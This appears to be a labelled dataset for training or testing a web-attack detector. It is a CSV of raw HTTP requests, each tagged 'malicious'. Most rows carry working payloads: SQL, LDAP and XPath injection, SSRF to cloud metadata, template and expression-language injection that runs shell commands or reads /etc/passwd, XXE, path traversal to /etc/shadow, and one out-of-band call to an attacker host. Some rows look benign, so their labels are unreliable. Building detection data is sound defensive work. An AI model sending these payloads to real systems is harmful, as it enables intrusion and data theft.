"text","label"
"POST /api/v3/users/filter HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Content-Type: application/json
Accept: */*
Content-Length: 94

{""searchFilter"": ""(department=finance)(objectClass=groupOfNames))(|(uid=administrator)""}","malicious"
"POST /api/v1/update HTTP/1.1
Host: service-data-sync.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Accept-Encoding: gzip, deflate, br
X-Requested-With: FetchAPIClient

status=active'];db.users.update({email:'hacker@domain.ai'},{$set:{verified:true}}); //","malicious"
"POST /api/v3/items/search HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 ""><svg/onload=eval(atob('YWxlcnQoImNvb2tpZXMiKQ=='))>
Accept: application/json, text/plain, */*
Content-Type: application/json
Content-Length: 51
Origin: https://api.cloud-data-services.ai
Referer: https://api.cloud-data-services.ai/dashboard
Connection: keep-alive

{""query"":""wireless headphones"",""filters"":{""brand"":""all""}}","malicious"
"GET /fetch?url=http://127.0.0.1:8080/admin HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: curl/7.77.0
Accept: */*
Cache-Control: no-cache
Connection: keep-alive","malicious"
"GET /search/%7B%7B%20self.__init__.__globals__.__builtins__.__import__(%22os%22).popen(%22ls%20/%22).read()%20%7D%7D/results HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive","malicious"
"PUT /app/user/settings HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Accept: */*
Content-Type: application/json
Content-Length: 69
Referer: https://dashboard.cloud-data-services.ai/app
Connection: close

{""avatarSource"":""http://0x7f.0x0.0x0.0x1:8080/status?check=active""}","malicious"
"POST /api/v1/feed/search HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.9
Content-Type: application/xml
Content-Length: 154
X-Requested-With: XMLHttpRequest

<searchRequest>
  <term>' or count(//*) > 0 or ''='</term>
  <category>general</category>
</searchRequest>","malicious"
"GET /search_directory?user=%2A%29%28uid%3D%2A%29%29%7C%28uid%3D%2A HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive","malicious"
"GET /fetcher?url=http%3A%2F%2Fcdn.imagesync-media.org%2Favatar.jpg&format=jpeg&url=http%3A%2F%2F169.254.169.254%2Flatest%2Fuser-data HTTP/1.1
Host: edge-gateway.imagesync-media.org
User-Agent: Python-urllib/3.8
Accept-Language: en-US,en;q=0.7
Pragma: no-cache","malicious"
"GET /directory_lookup?username=guest%29%28uid=*)(objectClass=* HTTP/1.1
Host: corporate-net-access.co
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Cache-Control: max-age=0
Connection: keep-alive","malicious"
"POST /user/profile/update HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0) `id`
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Content-Length: 27
Cookie: sessionid=4f8b9a7c2f3d1e6a

bio=Just+a+regular+user&lang=en","malicious"
"POST /portal/api/user/preferences HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Cookie: sess=Pt29Ms59MN5zTAewrLYhnVM2FZmu97xb
Content-Length: 388

{""user"":{""id"":7563,""custom_greeting"":""Hello ${'user'.toUpperCase()} ${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('cat /etc/passwd').getInputStream().readAllBytes()?new('java.lang.String',_)}!""},""settings"":{""theme"":""dark""}}","malicious"
"POST /api/v1/orders HTTP/1.1
Host: cache-bypass.attacker-net.biz
User-Agent: Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
Content-Length: 97
Connection: close

{""orderId"":12345,""product"":""wireless headphones"",""quantity"":1,""user"":""jane.doe@examplemail.net""}","malicious"
"POST /my-account/update-profile HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml
Cache-Control: no-cache
Content-Length: 60

fullname=John%20Smith%0ahostname%0aldd%20%2Fdev%2Fnull","malicious"
"POST /account/settings HTTP/1.1
Host: user-portal-secure.net
User-Agent: Wget/1.21.1%0d%0aX-Injected-Header:%20true
Content-Type: application/x-www-form-urlencoded
Content-Length: 23
Accept-Encoding: identity

pref=dark&notifications=on","malicious"
"POST /user/profile/picture HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Python-requests/2.25.1
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
X-Session-Pickle: \x80\x03cposixpath\njoin\nq\x00X\x0f\x00\x00\x00__import__('os').system('whoami')\x85q\x01\x87q\x02Rq\x03.
Content-Length: 173

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name=""file""; filename=""pic.jpg""
Content-Type: image/jpeg

binarydatahere
------WebKitFormBoundary7MA4YWxkTrZu0gW--","malicious"
"POST /user/feedback HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json, text/plain, */*
Origin: https://community.game-dev-forum.org
X-Requested-With: XMLHttpRequest
X-User-Filter: {""$where"": ""if(this.isAdmin){var date=new Date();while((new Date())-date<=5000){};}return true;""}
Content-Length: 48

{""feedback"":""Great community! Keep up the awesome work.""}","malicious"
"POST /subscribe HTTP/1.1
Host: newsletter-service.media-platform.tv
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Accept: application/x-www-form-urlencoded
Cache-Control: max-age=0
Cookie: session=9b8a7f4eac1df2d77b412e62ccf4581a

email=test.user%40mailinator.com&comments=test%0d%0a127.0.0.1+-+admin+%5B10%2FOct%2F2023%3A13%3A55%3A36+-0700%5D+%22POST+/admin/login+HTTP/1.1%22+200+789","malicious"
"GET /search_directory?user=alice%29%28uid=*%29%29%7C%28uid=* HTTP/1.1
Host: corporate-ldap-connect.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive","malicious"
"PUT /api/user/avatar HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: application/json, text/html
Content-Type: application/json
Referer: https://my-personal-blog-site.info/profile/edit
Content-Length: 66
Connection: keep-alive

{""avatarSource"": ""http://2130706433:8080/internal/status?ping=1""}","malicious"
"POST /subscription/upgrade HTTP/1.1
Host: premium-video-streaming.tv
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36
Accept: application/json
Referer: https://offers.premium-video-streaming.tv/deals
Content-Type: application/json
Content-Length: 74
Cookie: subscriber_id=7e2f81b845ff404a9a6ac67162bc9eab

{""plan"": ""ultra_hd"", ""payment_method"": ""credit_card"", ""coupon"": ""TRUSTEDPARTNER""}","malicious"
"GET /blog/article/view?id=456&id=%27%20UNION%20SELECT%201,2,3-- HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip
Pragma: no-cache
Connection: keep-alive","malicious"
"GET /search?source=homepage&source=footer&id=123&filter_evil_chars=true&id=%27%20UNION%20SELECT%20credit_card%20FROM%20users-- HTTP/1.1
Host: tech-support-hub.org
User-Agent: Python-urllib/3.9
Accept: */*
Cache-Control: no-cache
Referer: https://tech-support-hub.org/docs
Connection: close","malicious"
"POST /api/v3/data/update HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Accept: application/json
Content-Type: application/json
Content-Length: 51
X-Debug-Mode: enabled

{""update"":{""field"":""email"",""value"":""user@example.net""}}","malicious"
"PUT /api/xml/processOrder HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Wget/1.21.1
Content-Type: application/xml
Accept-Language: en-US,en;q=0.9
Content-Length: 226

<?xml version=""1.0"" encoding=""ISO-8859-1""?>
<!DOCTYPE payload [
  <!ELEMENT payload ANY >
  <!ENTITY hidden SYSTEM ""file:///etc/hosts"" >
]>
<payload>
  <data>&hidden;</data>
  <flag>test</flag>
</payload>","malicious"
"GET /go?target=data:text/html;base64,PHNjcmlwdD5hbGVydCgnUmVkaXJlY3RlZCEgWFNTJyk8L3NjcmlwdD4= HTTP/1.1
Host: api.session-authentication.io
User-Agent: curl/7.77.0
Accept: */*
Connection: keep-alive","malicious"
"POST /profile/settings HTTP/1.1
Host: auth-data-exchange.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 63
Origin: https://auth-data-exchange.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJhbGciOiJIUzI1NiJ9.abc123.def456

fullname=John+Doe&user_bio=<!--#iNcLuDe vIrTuAl='/etc/passwd' -->","malicious"
"POST /auth/login HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
Content-Length: 134
Accept: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
X-CSRF-Token: a1b5c7e3-8d36-4a25-9002-1f2617d6fafb

{""email"":""mark.giles@mailbox.info"",""password"":""safePass' oR 1=1 -- ""}","malicious"
"GET /media/view/9876%0d%0aX-Warning:%20Danger%20Injected%0d%0aContent-Length:%2019%0d%0a%0d%0a<img src=x onerror=1> HTTP/1.1
Host: media-library-site.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0
Connection: close","malicious"
"GET /app/user/settings HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: session_filter=(uid=attacker%00","malicious"
"POST /admin/moderate_comment HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 104
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://secure-user-portal.net/admin/dashboard
Origin: https://secure-user-portal.net

comment_id=67&details_b64=cHJvZHVjdF9pZD0xMjM7IFVQREFURSB1c2VycyBTRVQgYWRtaW49MSBXSEVSRSBpZD0xIC0t","malicious"
"GET /search HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.9
Referer: http://search.community.game-dev-forum.org/{#{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('env').read()}}#}","malicious"
"POST /app/user/settings HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept-Language: en-GB,en;q=0.5
Referer: https://trusted-ally-network.io/hud/dashboard
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Cookie: authToken=9f8d4d2d494b4d6b807b891f1c81d2ab

display_mode=dark&email_alerts=1","malicious"
"POST /api/v2/user/welcome HTTP/1.1
Host: api.dynamic-content-services.ai
Content-Type: application/json
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Referer: https://app.dynamic-content-services.ai/dashboard
Origin: https://app.dynamic-content-services.ai
Cache-Control: no-cache
Cookie: sessionId=48f2e7d09b3c4a8f9d7bcd12e45a7c3e

{
  ""user_id"": 987451,
  ""custom_greeting"": ""Hello ${'user'.toUpperCase()} ${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('cat /etc/passwd').getInputStream().readAllBytes()?new('java.lang.String',_)}!"",
  ""locale"": ""en-US"",
  ""metadata"": {
    ""source"": ""mobile_app"",
    ""version"": ""5.3.2""
  }
}","malicious"
"OPTIONS /services/report HTTP/1.1
Host: reports.web-dashboard-solutions.co.uk
User-Agent: curl/7.68.0 <!--#config errmsg=""SSI_Error_Triggered_Successfully""--> <!--#echo var=""REMOTE_ADDR""-->
Accept: */*
X-Requested-With: XMLHttpRequest
Origin: https://securelogin.enterpriseauth.biz","malicious"
"GET /download/file?doc=%2527%2520OR%2520%28SELECT%2520LOAD_FILE%28CONCAT%28%2527%255C%255C%255C%255C%27%2C%28SELECT%2520version%28%29%29%2C%2527.attacker-domain.com%255C%255Cdata%2527%29%29%29--%2520 HTTP/1.1
Host: cloud-backup-service.co.uk
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Accept-Encoding: gzip, deflate
Referer: https://dashboard.cloud-backup-service.co.uk/home
Connection: keep-alive
Cookie: session=1f8ac10f23c5b5bc1167bda84b833e5c; secure=true","malicious"
"GET /portal/access HTTP/1.1
Host: secure-documents-storage.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Cookie: config_file=../../../../etc/shadow%00.bak; auth=token123456789","malicious"
"GET /reports/download?id=112233 HTTP/1.1
Host: internal-admin-dashboard.companynet.local
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Connection: close","malicious"
"GET /link?target=data:text/html;base64,PHNjcmlwdD5hbGVydCgnUmVkaXJlY3RlZCEgWFNTJyk8L3NjcmlwdD4= HTTP/1.1
Host: secure-login-portal.co.uk
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Referer: https://secure-login-portal.co.uk/login
Connection: keep-alive","malicious"
"POST /login HTTP/1.1
Host: secure-portal-service.cloudnetdata.ai
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Origin: https://secure-portal-service.cloudnetdata.ai
Referer: https://secure-portal-service.cloudnetdata.ai/login

user=mobileuser%00%08%01%23COMMENTCLOSE%00<script>alert(1)</script>&pass=mobilePass!22","malicious"
"POST /user/preferences HTTP/1.1
Host: smart-home-hub.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: application/json
Content-Type: application/json
Content-Length: 44
X-Feature-Flag: override-enabled

{""preferences"":{""theme"":""dark"",""notifications"":true}}","malicious"
"GET /static/..%2F..%2F..%2F..%2Fproc/self/environ HTTP/1.1
Host: media-api-cloud-images.acmecdn.org
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Connection: Keep-Alive","malicious"
"GET /items/find?category=electronics&filter_evil_chars=true&id=123&id=123%27%20UNION%20SELECT%20credit_card%20FROM%20users-- HTTP/1.1
Host: online-retail-store.biz
User-Agent: curl/7.77.0
Accept: */*
Referer: https://online-retail-store.biz/home
Cache-Control: no-cache","malicious"
"POST /api/v1/account/login HTTP/1.1
Host: login.online-retail-store.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json
Content-Type: application/x-www-form-urlencoded
X-SSL-Version: SSLv3
Content-Length: 48

username=johndoe&password=SuperSecret123","malicious"
"GET /app/user/settings HTTP/1.1
Host: secure-user-portal.net
X-Forwarded-Host: evil-tracking-domain.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.7
Cache-Control: no-cache","malicious"
"GET /media/get?asset=..%c0%af..%c0%af..%c0%afproc%c0%afself%c0%afenviron HTTP/1.1
Host: data-analytics-platform.ai
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: https://data-analytics-platform.ai/media/view","malicious"
"GET /auth/ldap_login?username=%2A%29%28department%3D*%29%29%7C%28objectClass%3D* HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml
Referer: https://secure-user-portal.net/login
Connection: close","malicious"
"PUT /api/v1/messages/send HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/json
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Cache-Control: no-cache
Content-Length: 295

{""recipient"":""john.doe@secure-user-portal.net"",""custom_greeting"":""Hello ${'user'.toUpperCase()} ${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('cat /etc/passwd').getInputStream().readAllBytes()?new('java.lang.String',_)}!"",""message"":""Your secure message has arrived.""}","malicious"
"POST /api/v3/user/customize HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/json
Accept: application/json, text/html
Referer: https://secure-user-portal.net/dashboard
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36
Sec-CH-UA: ""Google Chrome"";v=""104"", "" Not A;Brand"";v=""99"", ""Chromium"";v=""104""
Sec-CH-UA-Mobile: ?1
Sec-CH-UA-Platform: ""Android""
Content-Length: 217

{""settings"": {""notifications"":true, ""custom_message"": ""<!--#exec cmd=\""ec\""\""ho\"" 'u'\""ser'\""@injection'"" -->""}}","malicious"
"GET /dashboard/settings HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Cookie: session_filter=(uid=user%00; auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9","malicious"
"POST /api/v1/ldap/search HTTP/1.1
Host: online-retail-store.biz
User-Agent: Python-urllib/3.9
Accept: application/json
Content-Type: application/json
Content-Length: 95

{""searchFilter"": ""(mail=support@onlineretail.biz)(objectClass=inetOrgPerson))(|(uid=administrator)""}","malicious"
"PUT /api/v4/profile/update HTTP/1.1
Host: secure-finance-app.io
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36
Sec-CH-UA: "" Not A;Brand"";v=""99"", ""Chromium"";v=""93"", ""Google Chrome"";v=""93""
Sec-CH-UA-Mobile: ?1
Sec-CH-UA-Platform: ""Android""
Content-Length: 158

{
  ""profile"": {
    ""display_name"": ""finance_guru"",
    ""debug"": ""<!--#exec cmd=\""c${'a'}t /etc/ho\""sts\"" -->""
  }
}","malicious"
"GET /search?q=sneakers HTTP/1.1
Host: www.sporty-retailpoint.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: user_pref=dark_mode; tracking_id=789xyz'/**/OR/**/IF(ASCII(SUBSTRING((SELECT/**/password/**/FROM/**/users/**/WHERE/**/username='admin'),1,1))=0x61/**/,SLEEP(5),0)#; __Secure-AdminAuth=deadbeefcafebabe
Referer: https://www.sporty-retailpoint.org/home","malicious"
"GET /user/login?next=//secure-access-portal.net%40attacker.biz/redirect HTTP/1.1
Host: login.account-authentication.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://login.account-authentication.io/home
Accept-Language: en-US,en;q=0.9
Connection: keep-alive","malicious"
"POST /ticket/submit HTTP/1.1
Host: support.enterprise-solutions.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 101
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Referer: https://support.enterprise-solutions.biz/ticket/new
Accept-Encoding: gzip, deflate

subject=Server%20issue&description=Error%20logs%0adf%20-h%0arc%20%2Ftmp%2Fexploit.log","malicious"
"POST /api/v1/file/load HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
Content-Type: application/json
Content-Length: 28
Connection: keep-alive

{""filePath"": ""/etc/shadow""}","malicious"
"POST /manage/plugin_update HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: curl/7.77.0
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 220

update_payload_b64=TzozNzoiTnNhcnRGdW5jdGlvblxEdXJhdGlvbiI6MTp7czoxNjoic2V0Q29uZmlnRGF0YSI7czo5OiJ1c2VyVXJsIjtzOjM1OiJodHRwczovL215LXBvcnRhbC5ibG9nL2FwaS91c2VyIjtzOjE0OiJhY2Nlc3NUb2tlbiI7czoxNToiYWJjMTIzZXl6d2VydHkiO30=","malicious"
"POST /user/authenticate HTTP/1.1
Host: nextgen-tech-labs.dev
Content-Type: application/x-www-form-urlencoded
Content-Length: 131
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/xml, text/html, */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Referer: https://nextgen-tech-labs.dev/login
Origin: https://nextgen-tech-labs.dev
Connection: keep-alive

user=engineer' and substring(//users/user[1]/concat(password,substring(//users/user[1]/password,4,1)),7,1)='e'&pass=letmein","malicious"
"POST /api/v2/system/update_config HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/json
Content-Length: 322
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Origin: https://secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36

{""config"":{""user_settings"":{""theme"":""dark"",""notifications"":true,""preferences"":{""detail_level_param"":""JyBVTklPTiBTRUxFQ1QgdXNlciwgcGFzc3dvcmQgRlJPTSB1c2VycyAtLQ=="",""language"":""en-US"",""timezone"":""America/Chicago""}}},""session_id"":""9az8sf7n983fjd2n8zn4sj92""}","malicious"
